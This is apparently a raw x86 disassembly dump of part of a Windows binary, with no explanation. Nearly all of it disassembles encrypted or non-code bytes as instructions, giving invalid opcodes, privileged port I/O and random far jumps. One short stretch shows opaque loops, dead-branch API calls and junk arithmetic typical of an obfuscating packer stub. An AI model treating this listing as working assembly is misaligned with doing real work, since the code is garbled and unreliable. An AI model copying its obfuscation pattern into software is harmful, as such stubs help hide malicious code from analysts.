  418915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418916:	jbe    0x418986
  418918:	loopne 0x4188b7
  41891a:	dec    eax
  41891b:	or     eax,0x809b8c15
  418920:	int    0xa
  418922:	retf   0x767b
  418925:	ins    DWORD PTR es:[edi],dx
  418926:	iret   
  418927:	push   edi
  418928:	sar    dh,0x5a
  41892b:	and    ecx,ebp
  41892d:	add    ah,BYTE PTR [edi-0x160fa130]
  418933:	jecxz  0x4189a6
  418935:	call   0x2843dac8
  41893a:	xchg   edi,eax
  41893b:	aas    
  41893c:	adc    al,0x9b
  41893e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41893f:	cdq    
  418940:	sub    DWORD PTR [esi],ecx
  418942:	pop    edx
  418943:	xor    BYTE PTR [esi+0x3abcdb3b],dh
  418949:	push   esi
  41894a:	xor    al,0xb9
  41894c:	sbb    eax,0x31e0d592
  418951:	and    BYTE PTR [esi-0x44],ah
  418954:	imul   ebx,DWORD PTR [edx+0x7a79b77c],0x18c5f72
  41895e:	inc    esp
  41895f:	in     eax,0x95
  418961:	(bad)  
  418962:	out    0x66,eax
  418964:	cmc    
  418965:	or     cl,BYTE PTR [ebp-0x6b0ddd07]
  41896b:	sub    dh,ch
  41896d:	xchg   BYTE PTR [ebx+0x41],bl
  418970:	jns    0x418987
  418972:	scas   eax,DWORD PTR es:[edi]
  418973:	iret   
  418974:	icebp  
  418975:	pop    ebx
  418976:	stc    
  418977:	(bad)  
  418979:	push   eax
  41897a:	jp     0x4189cc
  41897c:	cwde   
  41897d:	sbb    dh,BYTE PTR [ebx]
  41897f:	push   ecx
  418980:	fbstp  TBYTE PTR [ebx-0x17]
  418983:	dec    ebx
  418984:	jo     0x4189dc
  418986:	xlat   BYTE PTR ds:[ebx]
  418987:	pop    esp
  418988:	sbb    DWORD PTR [ebp-0x40],esi
  41898b:	fcom   DWORD PTR [edi+0x4ce350be]
  418991:	mov    ebx,0xf7d03bb7
  418996:	sub    BYTE PTR [edi+edx*2-0x10f52b0c],0x74
  41899e:	adc    BYTE PTR [eax],ah
  4189a0:	fisub  DWORD PTR [edi+0x10]
  4189a3:	scas   eax,DWORD PTR es:[edi]
  4189a4:	sti    
  4189a5:	sbb    edi,DWORD PTR [eax]
  4189a7:	test   DWORD PTR [ebp-0x504f40ed],edi
  4189ad:	hlt    
  4189ae:	ret    0xfd4b
  4189b1:	adc    eax,0xd6b8579d
  4189b6:	sub    dl,BYTE PTR [ebx+0x55584ee3]
  4189bc:	cmp    esp,esi
  4189be:	add    DWORD PTR [ebx-0x6d9ac190],esp
  4189c4:	aas    
  4189c5:	nop
  4189c6:	xor    ecx,eax
  4189c8:	add    ecx,esi
  4189ca:	adc    DWORD PTR ds:0x42a2ee,edi
  4189d0:	mov    DWORD PTR [ebp-0xc],ecx
  4189d3:	add    DWORD PTR ds:0x42a25a,0x6cdc
  4189dd:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4189e4:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  4189ee:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4189f5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4189fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4189ff:	mov    DWORD PTR ds:0x42a2ee,0x1b
  418a09:	cmp    DWORD PTR ds:0x42a2ee,0x0
  418a10:	je     0x418a4a
  418a16:	cmp    DWORD PTR ds:0x42a2ee,0x1c
  418a1d:	ja     0x418a4a
  418a23:	jmp    0x418a38
  418a28:	push   0x4b24
  418a2d:	push   0x42a296
  418a32:	call   DWORD PTR ds:0x42a3f2
  418a38:	mov    edi,DWORD PTR ds:0x42a2ee
  418a3e:	dec    edi
  418a3f:	mov    DWORD PTR ds:0x42a2ee,edi
  418a45:	jmp    0x418a09
  418a4a:	mov    DWORD PTR [ebp+0x8],ecx
  418a4d:	mov    edi,DWORD PTR ds:0x42a28e
  418a53:	xor    edi,DWORD PTR ds:0x42a2c6
  418a59:	mov    DWORD PTR ds:0x42a28e,edi
  418a5f:	mov    ecx,DWORD PTR [ebp+0x8]
  418a62:	xor    ecx,eax
  418a64:	mov    DWORD PTR ds:0x42a2b6,0x16
  418a6e:	cmp    DWORD PTR ds:0x42a2b6,0x0
  418a75:	je     0x418aac
  418a7b:	cmp    DWORD PTR ds:0x42a2b6,0x1d
  418a82:	ja     0x418aac
  418a88:	jmp    0x418a98
  418a8d:	push   0x42a28a
  418a92:	call   DWORD PTR ds:0x42a3f6
  418a98:	xor    edi,edi
  418a9a:	xor    edi,DWORD PTR ds:0x42a2b6
  418aa0:	dec    edi
  418aa1:	mov    DWORD PTR ds:0x42a2b6,edi
  418aa7:	jmp    0x418a6e
  418aac:	add    ecx,esi
  418aae:	mov    ecx,0x242ebc9
  418ab3:	mov    edi,0xf641bc8
  418ab8:	je     0x421e4f
  418abe:	and    DWORD PTR ds:0x42a27a,0x0
  418ac8:	jmp    0x418adc
  418acd:	xor    ebx,ebx
  418acf:	or     ebx,DWORD PTR ds:0x42a27a
  418ad5:	inc    ebx
  418ad6:	mov    DWORD PTR ds:0x42a27a,ebx
  418adc:	cmp    DWORD PTR ds:0x42a27a,0x14
  418ae3:	jae    0x418b2d
  418ae9:	cmp    DWORD PTR ds:0x42a27a,0xa
  418af0:	jb     0x418b2d
  418af6:	jmp    0x418b0e
  418afb:	push   DWORD PTR [ebp-0x14]
  418afe:	push   0x42a272
  418b03:	push   0x7a1d
  418b08:	call   DWORD PTR ds:0x42a3fa
  418b0e:	cmp    DWORD PTR ds:0x42a27a,0x9
  418b15:	jne    0x418b28
  418b1b:	mov    ebx,DWORD PTR ds:0x42a27a
  418b21:	inc    ebx
  418b22:	mov    DWORD PTR ds:0x42a27a,ebx
  418b28:	jmp    0x418acd
  418b2d:	mov    edx,DWORD PTR [ebp+0x8]
  418b30:	mov    ebx,DWORD PTR [ebp-0x8]
  418b33:	xor    edx,eax
  418b35:	xor    ebx,eax
  418b37:	sub    edx,ebx
  418b39:	sub    DWORD PTR ds:0x42a26e,edi
  418b3f:	sub    edx,esi
  418b41:	sub    ebx,0x5edd
  418b47:	xor    edx,eax
  418b49:	adc    ebx,DWORD PTR ds:0x42a272
  418b4f:	mov    DWORD PTR [ebp+0x8],edx
  418b52:	adc    DWORD PTR ds:0x42a2d6,edx
  418b58:	jmp    0x41aeb0
  418b5d:	add    al,ch
  418b5f:	test   BYTE PTR [edx-0x15ff7d6a],0x26
  418b66:	and    BYTE PTR [edx-0x3e],dl
  418b69:	or     al,0x7f
  418b6b:	xchg   edi,eax
  418b6c:	retf   
  418b6d:	(bad)  
  418b6e:	sbb    al,0x7c
  418b70:	add    DWORD PTR [esi+0x5e],0xffffff83
  418b74:	adc    ebp,0x4e
  418b77:	ret    
  418b78:	dec    esi
  418b79:	xchg   esi,eax
  418b7a:	mov    edi,0xda35f936
  418b7f:	adc    eax,0x5ea2717
  418b84:	cmc    
  418b85:	pop    edi
  418b86:	push   0xffffffeb
  418b88:	mov    ah,0xd6
  418b8a:	mov    ah,0xa0
  418b8c:	mov    cs,WORD PTR [esi-0x72]
  418b8f:	xchg   esp,eax
  418b90:	jnp    0x418bc0
  418b92:	(bad)  
  418b93:	clc    
  418b94:	popa   
  418b95:	or     BYTE PTR [ecx+0x64],bh
  418b98:	scas   al,BYTE PTR es:[edi]
  418b99:	push   cs
  418b9a:	ds jl  0x418bbd
  418b9d:	enter  0x9786,0x89
  418ba1:	pop    ebp
  418ba2:	xchg   edi,eax
  418ba3:	inc    edx
  418ba4:	clc    
  418ba5:	loopne 0x418b39
  418ba7:	(bad)  
  418ba8:	cmc    
  418ba9:	les    ebx,FWORD PTR [edi+0x5d440427]
  418baf:	shl    BYTE PTR [ebx],cl
  418bb1:	cdq    
  418bb2:	sbb    DWORD PTR [ebx+ecx*1],esp
  418bb5:	ret    0x2b7f
  418bb8:	and    edx,DWORD PTR [ebp+0x578afa0e]
  418bbe:	xchg   DWORD PTR [edx+0x41],ebp
  418bc1:	mov    al,ds:0x1b2cfc3a
  418bc6:	sti    
  418bc7:	neg    cl
  418bc9:	div    DWORD PTR [edi-0x6b]
  418bcc:	xchg   edi,eax
  418bcd:	cmp    DWORD PTR [eax-0x7a65b205],ebx
  418bd3:	cmc    
  418bd4:	pop    ss
  418bd5:	call   0x1adb:0x32422ee3
  418bdc:	std    
  418bdd:	adc    ebp,DWORD PTR [edx]
  418bdf:	pop    ebx
  418be0:	fwait
  418be1:	cmc    
  418be2:	jp     0x418bbc
  418be4:	jnp    0x418c29
  418be6:	outs   dx,DWORD PTR ds:[esi]
  418be7:	in     eax,dx
  418be8:	jecxz  0x418c0e
  418bea:	out    dx,al
  418beb:	lock push ds
  418bed:	push   0x4e
  418bef:	jecxz  0x418bab
  418bf1:	inc    edi
  418bf2:	push   ebp
  418bf3:	mov    eax,ds:0x6ec66542
  418bf8:	push   esi
  418bf9:	dec    ecx
  418bfa:	pop    esp
  418bfb:	ret    0x14fa
  418bfe:	nop
  418bff:	xor    ch,BYTE PTR [edi-0x70]
  418c02:	ret    0x5612
  418c05:	aaa    
  418c06:	lahf   
  418c07:	add    BYTE PTR [eax-0x44b58581],0xc3
  418c0e:	shl    BYTE PTR [ebx-0x95baf1d],0xf4
  418c15:	mov    bl,0xdc
  418c17:	and    esi,DWORD PTR [ebx-0x31890b21]
  418c1d:	xchg   DWORD PTR [ebp+0x6c],ecx
  418c20:	adc    al,0x3a
  418c22:	mov    DWORD PTR [edi+0x728f5a1c],0x28aa6c20
  418c2c:	sub    al,0x28
  418c2e:	leave  
  418c2f:	js     0x418bc7
  418c31:	xlat   BYTE PTR ds:[ebx]
  418c32:	fnstsw WORD PTR [eax]
  418c34:	mov    ebx,DWORD PTR [ecx-0x1c7b7eef]
  418c3a:	mov    al,ds:0x24ab6599
  418c3f:	cmp    eax,0x1e9c4d1
  418c44:	adc    cl,BYTE PTR [edx-0x2a7b40a7]
  418c4a:	in     eax,dx
  418c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c4c:	stos   BYTE PTR es:[edi],al
  418c4d:	xchg   DWORD PTR [ecx-0x5d],edi
  418c50:	outs   dx,DWORD PTR ds:[esi]
  418c51:	dec    eax
  418c52:	xchg   ebp,eax
  418c53:	cmp    BYTE PTR [eax-0x48],ch
  418c56:	into   
  418c57:	into   
  418c58:	(bad)  
  418c59:	js     0x418c66
  418c5b:	mov    esp,0x92b4b14f
  418c60:	ret    0x982b
  418c63:	xchg   ebp,eax
  418c64:	pop    ecx
  418c65:	ror    DWORD PTR [ebx-0x30],0x89
  418c69:	leave  
  418c6a:	and    bh,BYTE PTR [edi+0x16bad548]
  418c70:	push   eax
  418c71:	mov    edi,0x47340e49
  418c76:	xchg   esp,eax
  418c77:	out    0x3c,al
  418c79:	inc    ebp
  418c7a:	mov    cl,0x3c
  418c7c:	mov    bh,0x8f
  418c7e:	(bad)  
  418c7f:	fimul  WORD PTR [edx]
  418c81:	fwait
  418c82:	pop    esi
  418c83:	dec    ecx
  418c84:	ss ins DWORD PTR es:[edi],dx
  418c86:	ds xchg edx,eax
  418c88:	outs   dx,DWORD PTR ds:[esi]
  418c89:	ja     0x418d01
  418c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c8c:	into   
  418c8d:	pop    es
  418c8e:	pop    ebp
  418c8f:	ins    BYTE PTR es:[edi],dx
  418c90:	je     0x418d05
  418c92:	dec    esp
  418c94:	lahf   
  418c95:	add    DWORD PTR es:[ebx+0x5dbe6e29],ebp
  418c9c:	dec    ebp
  418c9d:	mov    ecx,DWORD PTR [eax]
  418c9f:	xchg   edi,eax
  418ca0:	or     BYTE PTR [esi+0xbc2232],bh
  418ca6:	retf   
  418ca7:	mov    DWORD PTR [ecx-0x5e4303f1],edi
  418cad:	or     DWORD PTR [ebx],edx
  418caf:	dec    esi
  418cb0:	push   eax
  418cb2:	xor    BYTE PTR [ebx],cl
  418cb4:	int    0x42
  418cb6:	mov    ah,bh
  418cb8:	shl    DWORD PTR [esi+0x4b],cl
  418cbb:	retf   0x36b5
  418cbe:	pop    ds
  418cbf:	pusha  
  418cc0:	shr    DWORD PTR [eax+edi*1-0x44],1
  418cc4:	mov    ds:0xd4927b66,eax
  418cc9:	mov    bh,0xbc
  418ccb:	sar    DWORD PTR [esi-0x50],1
  418cce:	mov    eax,0x48b6fcb8
  418cd3:	add    dh,0xae
  418cd6:	mov    WORD PTR [esi-0x6181705f],?
  418cdc:	aaa    
  418cdd:	cdq    
  418cde:	leave  
  418cdf:	dec    esp
  418ce0:	lahf   
  418ce1:	or     eax,0x4f5a6056
  418ce6:	and    eax,0xbe235f04
  418ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cec:	fnstenv [edx+0x7c587d18]
  418cf2:	ds pop ebp
  418cf4:	inc    ecx
  418cf5:	mov    ah,0xea
  418cf7:	xchg   esi,eax
  418cf8:	mov    eax,ds:0x605d4097
  418cfd:	cmp    al,0x51
  418cff:	fs inc esi
  418d01:	adc    al,0x86
  418d03:	lods   eax,DWORD PTR ds:[esi]
  418d04:	pop    edi
  418d05:	rcr    DWORD PTR [ecx],0xbd
  418d08:	aam    0xb7
  418d0a:	iret   
  418d0b:	ret    
  418d0c:	repnz xor eax,0x87dce786
  418d12:	push   ebx
  418d13:	pop    ds
  418d14:	(bad)  
  418d15:	fldenv [ecx]
  418d17:	daa    
  418d18:	clc    
  418d19:	push   ebp
  418d1a:	jg     0x418d0c
  418d1c:	mov    ecx,0x1b929f4a
  418d21:	nop
  418d22:	repnz sar cl,0xbf
  418d26:	(bad)  
  418d27:	sub    eax,0xee59ffa1
  418d2c:	cmp    DWORD PTR [eax-0x28756e06],ebp
  418d32:	cwde   
  418d33:	fwait
  418d34:	leave  
  418d35:	xlat   BYTE PTR ds:[ebx]
  418d36:	outs   dx,BYTE PTR ds:[esi]
  418d37:	and    ch,al
  418d39:	push   esp
  418d3a:	or     ecx,DWORD PTR ds:0x60e2a838
  418d40:	cs and eax,0xd0681faa
  418d46:	or     bh,dh
  418d48:	fcmovu st,st(5)
  418d4a:	call   0x7700:0xaf203a54
  418d51:	adc    ah,BYTE PTR [edi-0x40]
  418d54:	inc    ecx
  418d55:	es push 0xffffff9f
  418d58:	xchg   edi,ecx
  418d5a:	lahf   
  418d5b:	jae    0x418d23
  418d5d:	dec    ebp
  418d5e:	inc    esp
  418d5f:	sbb    DWORD PTR [ebx+0x1b],edi
  418d62:	popa   
  418d63:	(bad)  
  418d65:	xlat   BYTE PTR ds:[ebx]
  418d66:	aas    
  418d67:	pop    edx
  418d68:	ins    DWORD PTR es:[edi],dx
  418d69:	and    BYTE PTR [bx+di+0x662b],0xfa
  418d6f:	cmp    bh,BYTE PTR [ecx+0x4bfa683c]
  418d75:	cmp    cl,bl
  418d77:	into   
  418d78:	inc    ecx
  418d79:	dec    edx
  418d7a:	sub    edi,ebp
  418d7c:	sub    bh,dl
  418d7e:	int3   
  418d7f:	repz push 0x338e1a4d
  418d85:	mov    bl,dl
  418d87:	adc    ecx,DWORD PTR [edx-0x49e67773]
  418d8d:	mov    WORD PTR [ebp+0x43],fs
  418d90:	sbb    eax,0xa5c543c4
  418d95:	repz sbb ebx,DWORD PTR ds:0xa5406eb9
  418d9c:	jne    0x418d45
  418d9e:	mov    dl,0x14
  418da0:	sub    ebx,DWORD PTR [edx]
  418da2:	mov    es,WORD PTR [ecx]
  418da4:	(bad)  
  418da6:	push   ebx
  418da7:	fist   WORD PTR [ecx+ebx*1-0x499ea2ea]
  418dae:	sub    DWORD PTR [eax+0xf395391],ebp
  418db4:	rcl    BYTE PTR [eax+0x6b015a8],0x19
  418dbb:	js     0x418de2
  418dbd:	adc    edi,DWORD PTR [eax]
  418dbf:	push   ss
  418dc0:	jge    0x418d57
  418dc2:	test   eax,0x488647d9
  418dc7:	jo     0x418e31
  418dc9:	(bad)  
  418dca:	out    0xc0,eax
  418dcc:	mov    edi,0x1763415a
  418dd1:	mov    ch,0xdd
  418dd3:	gs dec eax
  418dd5:	(bad)  
  418dd6:	arpl   WORD PTR [ecx+0x675bed19],ax
  418ddc:	test   al,0x8a
  418dde:	xor    ch,BYTE PTR [ebx+0x4d]
  418de1:	aas    
  418de2:	inc    edi
  418de3:	sahf   
  418de4:	xor    eax,DWORD PTR [esi+0x56d02ad7]
  418dea:	cmp    edx,edi
  418dec:	dec    edi
  418ded:	xchg   esp,eax
  418dee:	push   ebp
  418def:	in     al,dx
  418df0:	scas   al,BYTE PTR es:[edi]
  418df1:	push   ds
  418df2:	cwde   
  418df3:	jmp    0xda77:0x2721c4ab
  418dfa:	shr    BYTE PTR [ecx-0xe],cl
  418dfd:	nop
  418dfe:	and    esp,DWORD PTR [edx+ecx*4-0x25b2c95]
  418e05:	cmp    al,0x21
  418e07:	mov    ss,WORD PTR ds:0x1c402782
  418e0d:	adc    cl,ch
  418e0f:	repnz in eax,dx
  418e11:	push   ss
  418e12:	std    
  418e13:	mov    DWORD PTR [eax+0x2c],0xb0a7c060
  418e1a:	stos   BYTE PTR es:[edi],al
  418e1b:	int    0xca
  418e1d:	push   eax
  418e1e:	les    ebp,FWORD PTR [ecx+ebx*4+0x28c8365]
  418e25:	arpl   bp,bp
  418e27:	stos   BYTE PTR es:[edi],al
  418e28:	cmp    BYTE PTR [ecx],0x62
  418e2b:	lds    eax,FWORD PTR [ebx]
  418e2d:	xchg   ebp,eax
  418e2e:	jb     0x418e00
  418e30:	repz les edx,FWORD PTR [ebx+0x6eee3788]
  418e37:	adc    cl,ah
  418e39:	mov    ebp,0xc956a387
  418e3e:	mov    esp,ebx
  418e40:	rol    eax,cl
  418e42:	xor    ch,0x1e
  418e45:	int    0x13
  418e47:	mov    WORD PTR [edx],gs
  418e49:	cmc    
  418e4a:	xchg   BYTE PTR [esi-0x73],ah
  418e4d:	jle    0x418ea7
  418e4f:	std    
  418e50:	adc    BYTE PTR [edi+eax*8+0x3f],0xfc
  418e55:	pop    edx
  418e56:	clc    
  418e57:	adc    dl,BYTE PTR [eax-0x25]
  418e5a:	xchg   ebp,eax
  418e5b:	add    eax,0x7f10b9fd
  418e60:	out    dx,eax
  418e61:	fild   WORD PTR [esi]
  418e63:	xchg   ebx,eax
  418e64:	pushf  
  418e65:	sar    esp,1
  418e67:	cld    
  418e68:	pop    edi
  418e69:	lods   al,BYTE PTR ds:[esi]
  418e6a:	pop    edi
  418e6b:	xchg   ebx,eax
  418e6c:	mov    WORD PTR [eax-0x375b33fc],?
  418e72:	mov    ah,dl
  418e74:	pop    ss
  418e75:	or     DWORD PTR [eax-0x4bac4627],0x68eb29e7
  418e7f:	cmc    
  418e80:	mov    bh,0xb7
  418e82:	jb     0x418e89
  418e84:	pop    esp
  418e85:	fst    QWORD PTR [ecx]
  418e87:	sub    dl,BYTE PTR [eax-0x51]
  418e8a:	add    DWORD PTR [esi],esi
  418e8c:	imul   esp,DWORD PTR [esi-0xd],0x5ca636d3
  418e93:	mov    al,ds:0x37f7f8f
  418e98:	inc    eax
  418e99:	sbb    ah,BYTE PTR [edx]
  418e9b:	fdivrp st(4),st
  418e9d:	xchg   edx,eax
  418e9e:	test   BYTE PTR fs:[ebx-0xc3b223b],0x47
  418ea6:	cmp    DWORD PTR [ecx+0x2c],ebx
  418ea9:	pop    ebx
  418eaa:	pop    edx
  418eab:	push   0x6d49e46d
  418eb0:	add    eax,0x7b11fb78
  418eb5:	pop    es
  418eb6:	xchg   esi,eax
  418eb7:	sbb    al,0x0
  418eb9:	sbb    edx,DWORD PTR [esi]
  418ebb:	lods   eax,DWORD PTR ds:[esi]
  418ebc:	ins    DWORD PTR es:[edi],dx
  418ebd:	jmp    0x3e90:0xc5dc0e18
  418ec4:	push   esi
  418ec5:	out    0xca,eax
  418ec7:	(bad)  
  418ec8:	mov    esi,0x6c5d9cdd
  418ecd:	add    ebx,edx
  418ecf:	(bad)  
  418ed0:	cmp    cl,bl
  418ed2:	xchg   ecx,eax
  418ed3:	and    BYTE PTR [eax],0xf8
  418ed6:	bound  esi,QWORD PTR [ecx-0x9]
  418ed9:	in     eax,dx
  418eda:	clc    
  418edb:	xchg   edi,eax
  418edc:	gs scas eax,DWORD PTR es:[edi]
  418ede:	fstp   QWORD PTR [ecx+0x46f22e6]
  418ee4:	int    0xf0
  418ee6:	das    
  418ee7:	push   es
  418ee8:	loopne 0x418eaa
  418eea:	xor    al,BYTE PTR [ecx+eiz*4+0x71]
  418eee:	fisubr WORD PTR [edx]
  418ef1:	xchg   esp,eax
  418ef2:	xor    al,0xaa
  418ef4:	leave  
  418ef5:	jne    0x418edf
  418ef7:	cdq    
  418ef8:	test   eax,0xc9bfc666
  418efd:	pop    ebx
  418efe:	pop    ebx
  418eff:	mov    eax,ds:0x1d262537
  418f04:	(bad)  
  418f05:	push   esi
  418f06:	retf   
  418f07:	sbb    eax,0xd92fa9f6
  418f0c:	push   eax
  418f0d:	loopne 0x418f3b
  418f0f:	inc    esp
  418f10:	cld    
  418f11:	stc    
  418f12:	sub    eax,0x94d6310e
  418f17:	and    al,0xd6
  418f19:	leave  
  418f1a:	adc    DWORD PTR [edi+0x1],ebp
  418f1d:	test   eax,0x24bffb73
  418f22:	cmp    DWORD PTR ds:0xd518090e,0x22
  418f29:	fisub  WORD PTR [edi]
  418f2b:	inc    ebx
  418f2c:	test   BYTE PTR [ebp+0x2a],bh
  418f2f:	inc    edi
  418f30:	push   cs
  418f31:	je     0x418ed4
  418f33:	cdq    
  418f34:	xor    ah,0x88
  418f37:	xchg   esi,eax
  418f38:	jmp    0x418f89
  418f3a:	(bad)  
  418f3b:	mov    dx,0x4112
  418f3f:	aas    
  418f40:	not    BYTE PTR [eax]
  418f42:	test   BYTE PTR [esi+0x56],bh
  418f45:	imul   ebp,DWORD PTR [ebx+esi*1],0x2192be10
  418f4c:	push   es
  418f4d:	in     eax,dx
  418f4e:	lds    edx,FWORD PTR [eax]
  418f50:	clc    
  418f51:	xor    ah,BYTE PTR [ebx]
  418f53:	paddw  mm7,mm7
  418f56:	rcr    DWORD PTR [edi+0x3e],0x12
  418f5a:	rol    DWORD PTR [ecx+0x20],0x15
  418f5e:	stc    
  418f5f:	cmp    ecx,esi
  418f61:	ret    0xdd2a
  418f64:	aas    
  418f65:	ss mov bh,0xf6
  418f68:	mov    ebx,0xaefa87dd
  418f6d:	sub    ah,dh
  418f6f:	push   ecx
  418f70:	push   0x3ebb1416
  418f75:	pop    eax
  418f76:	mov    ds:0x1418e363,eax
  418f7b:	lea    ebx,[esi+esi*4]
  418f7e:	mov    ch,0x20
  418f80:	ja     0x418fc6
  418f82:	and    al,0x5d
  418f84:	add    BYTE PTR [ebx],bh
  418f86:	fs icebp 
  418f88:	test   al,0x3e
  418f8a:	push   ecx
  418f8b:	xchg   esi,eax
  418f8c:	(bad)  
  418f8d:	loope  0x418f15
  418f8f:	pushf  
  418f90:	repnz sub edx,0x8d6f2a7e
  418f97:	sbb    al,0xbf
  418f99:	sub    eax,0xf1eabf29
  418f9e:	cmp    eax,DWORD PTR [ebx+0x6d]
  418fa1:	stos   BYTE PTR es:[edi],al
  418fa2:	imul   ebp,DWORD PTR [edx],0x28
  418fa5:	out    0x98,al
  418fa7:	call   0x774f:0xa4e9f1d3
  418fae:	int    0xab
  418fb0:	push   es
  418fb1:	sub    ebp,ebp
  418fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fb4:	cwde   
  418fb5:	arpl   WORD PTR [esi],di
  418fb7:	ss push ebp
  418fb9:	dec    eax
  418fba:	fsub   QWORD PTR [esi+0x65]
  418fbd:	sub    al,0xb6
  418fbf:	pop    edi
  418fc0:	mov    edx,0xdd85127e
  418fc5:	jno    0x418f61
  418fc7:	fistp  DWORD PTR [edi-0x7c]
  418fca:	push   cs
  418fcb:	(bad)  
  418fcd:	aaa    
  418fce:	xchg   ebp,eax
  418fcf:	loope  0x419004
  418fd1:	rol    DWORD PTR ds:0x46eefdc7,0xf5
  418fd8:	sub    eax,0x4ddc400d
  418fdd:	jp     0x418f76
  418fdf:	lds    esi,FWORD PTR [eax+eax*1+0x5c6d12a6]
  418fe6:	mov    cl,0xa1
  418fe8:	jo     0x419019
  418fea:	or     al,0x10
  418fec:	out    0x44,al
  418fee:	jg     0x41902d
  418ff0:	test   eax,0x909f583a
  418ff5:	iret   
  418ff6:	call   DWORD PTR [ebx*8+0x6f57a7b8]
  418ffd:	xchg   ecx,eax
  418ffe:	je     0x419047
  419000:	jae    0x418fb0
  419002:	aas    
  419003:	add    al,0xff
  419005:	dec    ebx
  419006:	inc    edi
  419007:	addr16 stc 
  419009:	mov    dl,0x77
  41900b:	pop    ds
  41900c:	das    
  41900d:	jp     0x41908e
  41900f:	inc    edx
  419010:	pop    esp
  419011:	mov    ecx,0x781f3af9
  419016:	mov    ds:0xe4422350,al
  41901b:	fwait
  41901c:	ret    
  41901d:	add    dh,bh
  41901f:	pop    edi
  419020:	push   es
  419021:	(bad)  
  419023:	ins    DWORD PTR es:[edi],dx
  419024:	xor    eax,0xa39ae766
  419029:	fcmovnb st,st(4)
  41902b:	add    BYTE PTR [ecx-0x12],0x43
  41902f:	das    
  419030:	in     al,0x5
  419032:	shl    dh,1
  419034:	jle    0x41907c
  419036:	shr    eax,1
  419038:	xlat   BYTE PTR ds:[ebx]
  419039:	add    BYTE PTR [eax+0x51],ah
  41903c:	xor    edx,DWORD PTR ds:0x53eceae9
  419042:	lods   eax,DWORD PTR ds:[esi]
  419043:	(bad)  
  419044:	aaa    
  419045:	sub    esi,ebp
  419047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419048:	mov    bh,0x8e
  41904a:	adc    eax,0xddcc0801
  41904f:	jno    0x419010
  419051:	push   cs
  419052:	iret   
  419053:	ds adc al,0x40
  419056:	jnp    0x419010
  419058:	ins    DWORD PTR es:[edi],dx
  419059:	jnp    0x418ffa
  41905b:	add    ch,bl
  41905d:	and    edi,esi
  41905f:	jecxz  0x419076
  419061:	sub    DWORD PTR [edx+0x30],0x2a301319
  419068:	data16 fsub QWORD PTR [ecx-0xd7877b7]
  41906f:	dec    edx
  419070:	test   BYTE PTR [ebx],dl
  419072:	(bad)
  419075:	xor    BYTE PTR [esi+0x3a],bh
  419078:	xrelease mov DWORD PTR [ebx],ebx
  41907b:	lahf   
  41907c:	icebp  
  41907d:	cmp    al,0xea
  41907f:	aaa    
  419080:	sub    eax,0xf9920e45
  419085:	xchg   ebp,eax
  419086:	jne    0x4190a9
  419088:	inc    ecx
  419089:	ins    DWORD PTR es:[edi],dx
  41908a:	push   0xeb0fe035
  41908f:	jl     0x4190a9
  419091:	sub    eax,0xbb700e43
  419096:	pop    es
  419097:	sbb    al,0xb0
  419099:	mov    ecx,0xb057de57
  41909e:	test   cl,ah
  4190a0:	(bad)  
  4190a1:	sub    esp,DWORD PTR [eax]
  4190a3:	test   BYTE PTR [ebx+0x7fcb94],cl
  4190a9:	jge    0x419030
  4190ab:	ja     0x4190c9
  4190ad:	adc    al,0xa7
  4190af:	sahf   
  4190b0:	jae    0x41910d
  4190b2:	int3   
  4190b3:	in     eax,0xe6
  4190b5:	int3   
  4190b6:	outs   dx,BYTE PTR ds:[esi]
  4190b7:	fs inc edi
  4190b9:	mov    ecx,0x929d0a64
  4190be:	clc    
  4190bf:	std    
  4190c0:	adc    bl,BYTE PTR [esi+0x12979103]
  4190c6:	mov    eax,ds:0x7421958b
  4190cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190cc:	nop
  4190cd:	xor    ch,0xd8
  4190d0:	push   0x849351a3
  4190d5:	xor    esp,DWORD PTR [eax+0x20]
  4190d8:	in     eax,0xdd
  4190da:	xor    dh,ah
  4190dc:	pop    edi
  4190dd:	ins    DWORD PTR es:[edi],dx
  4190de:	push   DWORD PTR [esi]
  4190e0:	jmp    0xfbbf:0x1e3090c5
  4190e7:	adc    al,0xb7
  4190e9:	pop    esp
  4190ea:	out    dx,eax
  4190eb:	clc    
  4190ec:	cdq    
  4190ed:	dec    esi
  4190ee:	or     eax,0x48c6d0f
  4190f3:	push   ebx
  4190f4:	push   cs
  4190f5:	fiadd  WORD PTR [ebp-0x681e344e]
  4190fb:	dec    esp
  4190fc:	inc    ecx
  4190fd:	das    
  4190fe:	push   ebx
  4190ff:	inc    esp
  419100:	nop
  419101:	xor    eax,0x8fcaace9
  419106:	sub    al,0xee
  419108:	nop
  419109:	xor    eax,0x94f5e152
  41910e:	mov    esp,cs
  419110:	mov    edi,0xba3ecb60
  419115:	jbe    0x419162
  419117:	dec    eax
  419118:	call   FWORD PTR [ecx+0x5d]
  41911b:	daa    
  41911c:	xchg   edx,eax
  41911d:	xchg   BYTE PTR [edi+0x140db711],al
  419123:	mov    al,ds:0x30d7dd15
  419128:	js     0x419133
  41912a:	js     0x419131
  41912c:	fcomp  DWORD PTR [ecx]
  41912e:	mov    cl,0xdf
  419130:	(bad)  
  419132:	mov    ds:0x9926db26,al
  419137:	scas   eax,DWORD PTR es:[edi]
  419138:	adc    edx,DWORD PTR [esi+0xd1e8e80]
  41913e:	iret   
  41913f:	ins    BYTE PTR es:[edi],dx
  419140:	push   0x56
  419142:	sbb    ah,BYTE PTR [eax]
  419144:	adc    DWORD PTR [eax],0x9b926c3d
  41914a:	aam    0xed
  41914c:	xchg   DWORD PTR [edi-0x2bd1038],edx
  419152:	adc    edx,ebx
  419154:	push   ecx
  419155:	inc    esp
  419156:	push   ss
  419157:	gs push ds
  419159:	add    al,0x7b
  41915b:	aas    
  41915c:	inc    edi
  41915d:	addr16 ret 
  41915f:	cmp    BYTE PTR [ebx+0x3b],cl
  419162:	inc    edx
